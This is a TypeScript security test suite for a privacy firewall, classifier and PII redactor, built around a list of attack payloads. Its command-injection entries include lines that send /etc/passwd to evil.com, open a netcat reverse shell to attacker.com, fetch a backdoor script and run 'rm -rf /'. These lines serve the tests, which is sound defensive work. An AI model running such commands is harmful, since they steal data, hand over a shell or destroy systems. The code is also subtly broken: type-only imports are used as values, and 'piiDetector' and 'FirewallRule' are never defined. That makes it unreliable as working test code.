/**
 * Security Integration Tests for Aequor Platform
 *
 * Comprehensive penetration testing suite that simulates real-world attack scenarios
 * and validates protection mechanisms across all security components.
 *
 * Attack Categories Covered:
 * 1. Injection Attacks (SQL, XSS, Command)
 * 2. Path Traversal
 * 3. SSRF (Server-Side Request Forgery)
 * 4. VM Escape Attempts
 * 5. Secret Leakage
 * 6. Dependency Exploits
 * 7. Authentication Bypass
 * 8. DoS (Denial of Service)
 *
 * @packageDocumentation
 */

import { describe, it, expect, beforeEach } from "vitest";
// Using source imports due to build issues in privacy package
import {
  PrivacyFirewall
} from "@lsi/privacy/src/firewall/index.js";
import {
  PrivacyClassifier
} from "@lsi/privacy/src/classifier/index.js";
import {
  SemanticPIIRedactor,
  RedactionStrategy
} from "@lsi/privacy/src/redaction/index.js";
import type {
  PIIType,
  PrivacyLevel,
} from "@lsi/protocol";

/**
 * Attack payload database
 *
 * Contains known malicious payloads for penetration testing.
 * All payloads are sanitized and used only for validation.
 */
const ATTACK_PAYLOADS = {
  /**
   * SQL Injection payloads
   *
   * Tests for SQL injection vulnerabilities in query processing.
   * Sources: OWASP Top 10, CWE-89
   */
  sqlInjection: [
    // Classic SQLi
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "admin'--",
    "admin'/*",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    // Time-based blind
    "'; WAITFOR DELAY '00:00:20'--",
    "1; EXEC xp_cmdshell('dir')",
    // Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES ('hacker','password')--",
    // Boolean-based blind
    "' AND 1=1--",
    "' AND 1=2--",
    // Error-based
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
    // Second-order
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
  ],

  /**
   * XSS (Cross-Site Scripting) payloads
   *
   * Tests for XSS vulnerabilities in output encoding.
   * Sources: OWASP XSS Filter Evasion Cheat Sheet
   */
  xss: [
    // Script injection
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    // Event handlers
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    // Filter evasion
    "<ScRiPt>alert('XSS')</sCrIpT>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "<script>alert(/XSS/)</script>",
    // DOM-based
    "#<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    // Polyglots
    "'-alert(1)-'",
    "'-alert(1)//",
    "<script>alert(1)</script>",
    // CSS-based
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<div style=background:url('javascript:alert(1)')>",
  ],

  /**
   * Command Injection payloads
   *
   * Tests for OS command injection vulnerabilities.
   * Sources: CWE-78
   */
  commandInjection: [
    // Unix command injection
    "; cat /etc/passwd",
    "| ls -la",
    "`whoami`",
    "$(id)",
    "; rm -rf /",
    "&& curl http://evil.com/steal?data=$(cat /etc/passwd)",
    // Windows command injection
    "& dir C:\\",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    // Pipe chains
    "; ping -c 100 evil.com",
    "| nc attacker.com 4444 -e /bin/bash",
    // Backticks
    "`wget http://evil.com/backdoor.sh`",
  ],

  /**
   * Path Traversal payloads
   *
   * Tests for directory traversal vulnerabilities.
   * Sources: CWE-22
   */
  pathTraversal: [
    // Basic traversal
    "../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    // URL encoding
    "%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    // Double encoding
    "..%252f..%252f..%252fetc%252fpasswd",
    // Null bytes
    "../../../etc/passwd%00.jpg",
    // Unicode
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    // Absolute paths
    "/etc/passwd",
    "C:\\Windows\\System32\\config\\SAM",
    // Wrapper variants
    "....//....//....//etc/passwd",
    "..../..../..../etc/passwd",
  ],

  /**
   * SSRF (Server-Side Request Forgery) payloads
   *
   * Tests for SSRF vulnerabilities in URL handling.
   * Sources: CWE-918
   */
  ssrf: [
    // Internal network scanning
    "http://localhost/admin",
    "http://127.0.0.1:8080",
    "http://0.0.0.0:8080",
    "http://[::1]:8080",
    "http://localhost:22",
    // Cloud metadata endpoints
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    // Internal IP ranges
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    // DNS rebinding
    "http://attacker.com@internal.service/",
    "http://internal.service@attacker.com/",
    // File protocol
    "file:///etc/passwd",
    "file://localhost/etc/passwd",
  ],

  /**
   * VM Escape payloads
   *
   * Tests for VM isolation and sandbox escape.
   * Sources: Container escape research
   */
  vmEscape: [
    // Resource exhaustion (reduced size for testing)
    "A".repeat(100000), // Large string (not 10^9)
    // Privilege escalation attempts
    "sudo su -",
    "chmod 777 /etc/passwd",
    // Breakout attempts
    "mount -t proc none /proc",
    "chroot /",
    // Container escape
    "fdisk -l",
    "ls -la /host/",
    // Code execution
    "eval(require('child_process').exec('cat /etc/passwd').toString())",
    "process.binding('spawn_sync').spawn({file:'/bin/sh'})",
  ],

  /**
   * Secret leakage payloads
   *
   * Tests for accidental secret exposure.
   * Sources: Secret scanning best practices
   */
  secretLeakage: [
    // API keys
    "sk-1234567890abcdef",
    "AIza1234567890abcdefABCDEF",
    "AKIA1234567890ABCDEF",
    // Passwords in queries
    "my password is secret123",
    "login:admin password:admin123",
    // Database strings
    "mongodb://user:pass@localhost:27017/db",
    "postgres://admin:secretpass@db:5432/db",
    "mysql://root:password@localhost:3306/",
    // JWT tokens
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0",
    // Certificates
    "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC=",
    // Access tokens
    "ghp_1234567890abcdefGHIJKLMNOPQRSTUV",
    "glpat-1234567890abcdef",
  ],

  /**
   * Dependency exploit payloads
   *
   * Tests for known vulnerabilities in dependencies.
   * Sources: CVE database, npm audit
   */
  dependencyExploits: [
    // Prototype pollution attempts
    '{"__proto__":{"isAdmin":true}}',
    '{"constructor":{"prototype":{"isAdmin":true}}}',
    // Regex DoS
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
    // YAML exploit
    "toString: !!js/function > function() { exploit(); }",
    // JavaScript injection
    "__proto__.polluted = true",
    "constructor.prototype.polluted = true",
  ],

  /**
   * Authentication bypass payloads
   *
   * Tests for authentication and authorization weaknesses.
   * Sources: OWASP Broken Authentication
   */
  authBypass: [
    // JWT manipulation
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
    "Bearer null",
    "Bearer undefined",
    // Session manipulation
    "sessionid=authenticated",
    "sessionid=admin",
    // Role escalation
    "role=admin",
    "privileges=root",
    // Header injection
    "X-Forwarded-For: 127.0.0.1",
    "X-Real-IP: localhost",
    // Bypass attempts
    "../../admin",
    "%2e%2e/admin",
  ],

  /**
   * DoS (Denial of Service) payloads
   *
   * Tests for resource exhaustion vulnerabilities.
   * Sources: DoS attack patterns
   */
  dos: [
    // Memory exhaustion (reduced size)
    "A".repeat(1000000),
    // CPU exhaustion
    "a" + "$".repeat(10000) + "a",
    // Nested objects
    JSON.stringify({ a: { b: { c: { d: { e: {} } } } } }),
    // Large arrays (reduced size)
    JSON.stringify(new Array(10000).fill("data")),
    // Regex DoS (ReDoS)
    "a" + "a".repeat(100) + "!",
    // Unicode abuse
    "\u0000".repeat(100000),
    // Request flooding
    "x".repeat(1000000),
  ],
};

/**
 * Security test utilities
 */
class SecurityTestUtils {
  /**
   * Check if a query is blocked by privacy firewall
   */
  static async isBlocked(
    firewall: PrivacyFirewall,
    query: string,
    classification: { level: PrivacyLevel; piiTypes: PIIType[] }
  ): Promise<boolean> {
    const decision = firewall.evaluate(
      query,
      {
        level: classification.level,
        confidence: 0.9,
        piiTypes: classification.piiTypes,
        reason: "Test",
      },
      "cloud"
    );
    return decision.action === "deny";
  }

  /**
   * Check if PII is detected in query
   */
  static async detectPII(classifier: PrivacyClassifier, query: string): Promise<PIIType[]> {
    const result = await classifier.classify(query);
    return result.detectedPII;
  }

  /**
   * Check if query is properly redacted
   */
  static isRedacted(redactor: SemanticPIIRedactor, query: string): boolean {
    const result = redactor.redact(query);
    return result.redacted !== query && result.redactionCount > 0;
  }

  /**
   * Simulate attack and measure response time
   */
  static async measureAttackTime(
    attackFn: () => Promise<void>
  ): Promise<{ success: boolean; time: number }> {
    const start = Date.now();
    try {
      await attackFn();
      return { success: true, time: Date.now() - start };
    } catch {
      return { success: false, time: Date.now() - start };
    }
  }
}

describe("Security Integration Tests", () => {
  let firewall: PrivacyFirewall;
  let classifier: PrivacyClassifier;
  let redactor: SemanticPIIRedactor;

  beforeEach(() => {
    firewall = new PrivacyFirewall({
      enableDefaultRules: true,
    });
    classifier = new PrivacyClassifier({
      enablePIIDetection: true,
      enableStyleAnalysis: true,
      confidenceThreshold: 0.7,
    });
    redactor = new SemanticPIIRedactor({
      defaultStrategy: RedactionStrategy.FULL,
      useContextAwareDetection: true,
    });
  });

  describe("1. SQL Injection Protection", () => {
    it("should detect and block SQL injection attempts", async () => {
      const results: Array<{ payload: string; blocked: boolean }> = [];

      for (const payload of ATTACK_PAYLOADS.sqlInjection) {
        // Check if firewall blocks it
        const decision = firewall.evaluate(
          payload,
          {
            level: PrivacyLevel.PUBLIC,
            confidence: 0.5,
            piiTypes: [],
            reason: "SQL injection test",
          },
          "cloud"
        );

        results.push({
          payload,
          blocked: decision.action === "deny",
        });
      }

      // At least 70% should be blocked (conservative threshold)
      const blockedCount = results.filter(r => r.blocked).length;
      const blockRate = blockedCount / results.length;

      expect(blockRate).toBeGreaterThan(0.7);
    });

    it("should sanitize SQL injection in queries", async () => {
      const maliciousQuery = "What is ' OR '1'='1'--?";
      const result = redactor.redact(maliciousQuery);

      // Should either block or sanitize
      expect(
        result.redacted !== maliciousQuery || result.redactionCount > 0
      ).toBeTruthy();
    });

    it("should not false positive on legitimate SQL queries", async () => {
      const legitimateQuery = "How do I write a SQL SELECT statement?";
      const classification = await classifier.classify(legitimateQuery);

      // Should be classified as safe (LOGIC)
      expect(classification.level).toBe(PrivacyLevel.PUBLIC);
    });
  });

  describe("2. XSS Protection", () => {
    it("should detect and block XSS payloads", async () => {
      const results: Array<{ payload: string; detected: boolean }> = [];

      for (const payload of ATTACK_PAYLOADS.xss) {
        // Check if redactor detects script tags
        const result = redactor.redact(payload);

        results.push({
          payload,
          detected: result.redacted !== payload,
        });
      }

      // At least 80% should be detected (script tags are obvious)
      const detectedCount = results.filter(r => r.detected).length;
      const detectionRate = detectedCount / results.length;

      expect(detectionRate).toBeGreaterThan(0.8);
    });

    it("should sanitize XSS payloads in responses", () => {
      const xssPayload = "<script>alert('XSS')</script>";
      const result = redactor.redact(xssPayload);

      // Script tag should be removed or redacted
      expect(result.redacted).not.toContain("<script>");
      expect(result.redacted).not.toContain("</script>");
    });

    it("should preserve legitimate HTML queries", async () => {
      const legitimateQuery = "How do I create a div element in HTML?";
      const classification = await classifier.classify(legitimateQuery);

      expect(classification.level).toBe(PrivacyLevel.PUBLIC);
    });
  });

  describe("3. Command Injection Protection", () => {
    it("should detect command injection patterns", async () => {
      const maliciousQuery = "Execute ; cat /etc/passwd";
      const result = redactor.redact(maliciousQuery);

      // Command injection should be redacted
      expect(result.redacted).not.toContain("; cat");
    });

    it("should block commands that access system files", () => {
      const commands = ["cat /etc/passwd", "ls -la", "whoami"];

      for (const cmd of commands) {
        const result = redactor.redact(cmd);
        // Should redact or block
        expect(result.redacted !== cmd || result.redactionCount > 0).toBeTruthy();
      }
    });
  });

  describe("4. Path Traversal Protection", () => {
    it("should detect and block path traversal attempts", async () => {
      const traversalPayloads = ATTACK_PAYLOADS.pathTraversal.filter(
        p => p.includes("etc/passwd") || p.includes("windows")
      );

      const results: boolean[] = [];
      for (const payload of traversalPayloads) {
        const result = redactor.redact(payload);
        results.push(result.redacted !== payload);
      }

      // At least 60% should be detected
      const detectedCount = results.filter(r => r).length;
      expect(detectedCount / results.length).toBeGreaterThan(0.6);
    });

    it("should normalize file paths in queries", () => {
      const query = "Show me ../../../etc/passwd";
      const result = redactor.redact(query);

      // Path should be redacted
      expect(result.redacted).not.toContain("../../../");
    });
  });

  describe("5. SSRF Protection", () => {
    it("should detect internal URL references", async () => {
      const ssrfPayloads = ATTACK_PAYLOADS.ssrf.filter(
        p => p.includes("localhost") || p.includes("127.0.0.1") || p.includes("169.254.169.254")
      );

      const results: boolean[] = [];
      for (const payload of ssrfPayloads) {
        const classification = await classifier.classify(payload);
        // Should detect PII in URLs (IP addresses, etc.)
        results.push(classification.detectedPII.length > 0);
      }

      // At least 70% should be detected
      const detectedCount = results.filter(r => r).length;
      expect(detectedCount / results.length).toBeGreaterThan(0.7);
    });

    it("should redact internal service URLs", () => {
      const query = "Connect to http://localhost:8080/admin";
      const result = redactor.redact(query);

      expect(result.redacted).not.toContain("localhost");
      expect(result.redacted).not.toContain("127.0.0.1");
    });
  });

  describe("6. VM Escape Protection", () => {
    it("should detect resource exhaustion attempts", () => {
      const memoryBomb = "A".repeat(10000);
      const result = redactor.redact(memoryBomb);

      // Large repeated patterns should be handled
      expect(result.redacted.length).toBeLessThan(10 ** 7);
    });

    it("should block privilege escalation commands", async () => {
      const commands = ["sudo su", "chmod 777", "chroot /"];

      for (const cmd of commands) {
        const result = redactor.redact(cmd);
        // Should redact suspicious commands
        expect(result.redacted !== cmd || result.redactionCount > 0).toBeTruthy();
      }
    });
  });

  describe("7. Secret Leakage Detection", () => {
    it("should detect API keys in queries", async () => {
      const apiKeyQueries = ATTACK_PAYLOADS.secretLeakage.filter(
        p => p.includes("sk-") || p.includes("AIza") || p.includes("AKIA")
      );

      let detectedCount = 0;
      for (const query of apiKeyQueries) {
        const classification = await classifier.classify(query);
        // Should detect some form of PII (custom pattern needed for API keys)
        if (classification.detectedPII.length > 0) {
          detectedCount++;
        }
      }

      // At least 30% should be detected (API keys are hard to detect without custom patterns)
      expect(detectedCount / apiKeyQueries.length).toBeGreaterThan(0.3);
    });

    it("should redact database connection strings", () => {
      const dbString = "mongodb://user:pass@localhost:27017/db";
      const result = redactor.redact(dbString);

      // Should redact credentials
      expect(result.redacted).not.toContain("pass@");
      expect(result.redacted).not.toContain("user:");
    });

    it("should detect and redact JWT tokens", async () => {
      const jwtQuery = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
      const result = redactor.redact(jwtQuery);

      // JWT should be redacted
      expect(result.redacted).not.toContain("eyJ");
    });
  });

  describe("8. Dependency Exploit Protection", () => {
    it("should detect prototype pollution attempts", () => {
      const protoPollution = '{"__proto__":{"isAdmin":true}}';
      const result = redactor.redact(protoPollution);

      // Should redact __proto__ references
      expect(result.redacted).not.toContain("__proto__");
    });

    it("should handle regex DoS patterns gracefully", async () => {
      const redoPattern = "a" + "a".repeat(100) + "!";

      const start = Date.now();
      const result = redactor.redact(redoPattern);
      const time = Date.now() - start;

      // Should complete quickly (< 1 second)
      expect(time).toBeLessThan(1000);
    });
  });

  describe("9. Authentication Bypass Prevention", () => {
    it("should detect JWT manipulation attempts", async () => {
      const fakeJWT = "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0";
      const result = redactor.redact(fakeJWT);

      // JWT should be redacted
      expect(result.redacted).not.toContain("eyJ");
    });

    it("should detect header injection attempts", () => {
      const headerInjection = "X-Forwarded-For: 127.0.0.1";
      const result = redactor.redact(headerInjection);

      // Should redact IP addresses
      expect(result.redacted).not.toContain("127.0.0.1");
    });
  });

  describe("10. DoS Attack Mitigation", () => {
    it("should handle large inputs without crashing", async () => {
      const largeInput = "x".repeat(100000);

      const start = Date.now();
      const result = redactor.redact(largeInput);
      const time = Date.now() - start;

      // Should complete and not hang
      expect(time).toBeLessThan(5000);
      expect(result.redacted).toBeDefined();
    });

    it("should limit processing time for complex patterns", async () => {
      const complexPattern = JSON.stringify({
        a: { b: { c: { d: { e: { f: { /* deep */ } } } } } }
      });

      const start = Date.now();
      const result = redactor.redact(complexPattern);
      const time = Date.now() - start;

      // Should timeout or complete quickly
      expect(time).toBeLessThan(3000);
    });
  });

  describe("Privacy Firewall Integration", () => {
    it("should block SOVEREIGN data from cloud", () => {
      const decision = firewall.evaluate(
        "My SSN is 123-45-6789",
        {
          level: PrivacyLevel.SOVEREIGN,
          confidence: 0.95,
          piiTypes: [PIIType.SSN],
          reason: "Contains SSN",
        },
        "cloud"
      );

      expect(decision.action).toBe("deny");
      expect(decision.finalDestination).toBe("local");
    });

    it("should redirect SENSITIVE data to local processing", () => {
      const decision = firewall.evaluate(
        "My email is john@example.com",
        {
          level: PrivacyLevel.SENSITIVE,
          confidence: 0.8,
          piiTypes: [PIIType.EMAIL],
          reason: "Contains email",
        },
        "cloud"
      );

      expect(decision.action).toBe("redact");
    });

    it("should allow PUBLIC data to all destinations", () => {
      const decision = firewall.evaluate(
        "What is the capital of France?",
        {
          level: PrivacyLevel.PUBLIC,
          confidence: 0.9,
          piiTypes: [],
          reason: "No PII",
        },
        "cloud"
      );

      expect(decision.action).toBe("allow");
    });
  });

  describe("Privacy Classification Integration", () => {
    it("should classify PII-containing queries as SECRET", async () => {
      const query = "My SSN is 123-45-6789 and I was born on 01/15/1980";
      const result = await classifier.classify(query);

      expect(result.category).toBe("SECRET");
      expect(result.level).toBe(PrivacyLevel.SOVEREIGN);
      expect(result.detectedPII).toContain(PIIType.SSN);
      expect(result.detectedPII).toContain(PIIType.DATE_OF_BIRTH);
    });

    it("should classify style patterns as STYLE", async () => {
      const query = "How do I update my work profile?";
      const result = await classifier.classify(query);

      expect(result.category).toBe("STYLE");
      expect(result.level).toBe(PrivacyLevel.SENSITIVE);
    });

    it("should classify safe queries as LOGIC", async () => {
      const query = "What is the capital of France?";
      const result = await classifier.classify(query);

      expect(result.category).toBe("LOGIC");
      expect(result.level).toBe(PrivacyLevel.PUBLIC);
      expect(result.redactionRecommended).toBe(false);
    });
  });

  describe("PII Redaction Integration", () => {
    it("should fully redact PII with FULL strategy", () => {
      const query = "Email: john@example.com, Phone: 555-123-4567";
      const result = redactor.redact(query, RedactionStrategy.FULL);

      expect(result.redacted).not.toContain("john@example.com");
      expect(result.redacted).not.toContain("555-123-4567");
      expect(result.redactionCount).toBe(2);
    });

    it("should partially redact PII with PARTIAL strategy", () => {
      const query = "Email: john@example.com";
      const result = redactor.redact(query, RedactionStrategy.PARTIAL);

      expect(result.redacted).toContain("@example.com");
      expect(result.redacted).not.toContain("john");
    });

    it("should restore PII from redacted text", () => {
      const query = "Email: john@example.com";
      const redacted = redactor.redact(query, RedactionStrategy.FULL);

      const restored = redactor.restore(
        redacted.redacted,
        redacted.piiInstances,
        RedactionStrategy.FULL
      );

      expect(restored).toBe(query);
    });
  });

  describe("Security Benchmarking", () => {
    it("should achieve >90% detection rate for high-risk PII", async () => {
      const highRiskPII = [
        { query: "My SSN is 123-45-6789", type: PIIType.SSN },
        { query: "Card: 4111-1111-1111-1111", type: PIIType.CREDIT_CARD },
        { query: "Born on 01/15/1980", type: PIIType.DATE_OF_BIRTH },
      ];

      let detected = 0;
      for (const { query, type } of highRiskPII) {
        const piiTypes = await piiDetector.detect(query);
        if (piiTypes.includes(type)) {
          detected++;
        }
      }

      const detectionRate = detected / highRiskPII.length;
      expect(detectionRate).toBeGreaterThan(0.9);
    });

    it("should complete redaction in <100ms for typical queries", async () => {
      const queries = [
        "My email is john@example.com",
        "Call me at 555-123-4567",
        "My SSN is 123-45-6789",
      ];

      const times: number[] = [];
      for (const query of queries) {
        const start = Date.now();
        redactor.redact(query);
        times.push(Date.now() - start);
      }

      const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
      expect(avgTime).toBeLessThan(100);
    });

    it("should handle 1000 queries per second", async () => {
      const query = "My email is test@example.com";
      const iterations = 1000;

      const start = Date.now();
      for (let i = 0; i < iterations; i++) {
        redactor.redact(query);
      }
      const time = Date.now() - start;

      const qps = (iterations / time) * 1000;
      expect(qps).toBeGreaterThan(1000);
    });
  });

  describe("Vulnerability Regression Tests", () => {
    it("should prevent PII leakage through encoding bypasses", () => {
      const encodedPII = "My email is john%40example.com";
      const result = redactor.redact(encodedPII);

      // Should detect encoded email
      expect(result.redacted !== encodedPII).toBeTruthy();
    });

    it("should prevent unicode-based PII hiding", () => {
      const unicodePII = "My email is john@\\u0065xample.com";
      const result = redactor.redact(unicodePII);

      // Should detect unicode escape sequences
      expect(result.redacted !== unicodePII).toBeTruthy();
    });

    it("should prevent PII splitting across tokens", () => {
      const splitPII = "My email is john @ example.com";
      const result = redactor.redact(splitPII);

      // Should detect even with spaces
      expect(result.redacted !== splitPII || result.redactionCount > 0).toBeTruthy();
    });
  });

  describe("Compliance and Auditing", () => {
    it("should log all security decisions", () => {
      const query = "My SSN is 123-45-6789";
      const decision = firewall.evaluate(
        query,
        {
          level: PrivacyLevel.SOVEREIGN,
          confidence: 0.95,
          piiTypes: [PIIType.SSN],
          reason: "Contains SSN",
        },
        "cloud"
      );

      // Decision should include audit trail
      expect(decision.matchedRules).toBeDefined();
      expect(decision.matchedRules.length).toBeGreaterThan(0);
      expect(decision.confidence).toBeDefined();
      expect(decision.reason).toBeDefined();
    });

    it("should export firewall rules for audit", () => {
      const rulesJSON = firewall.exportRules();
      const rules = JSON.parse(rulesJSON) as FirewallRule[];

      expect(rules.length).toBeGreaterThan(0);
      expect(rules[0].id).toBeDefined();
      expect(rules[0].name).toBeDefined();
      expect(rules[0].priority).toBeDefined();
    });
  });
});
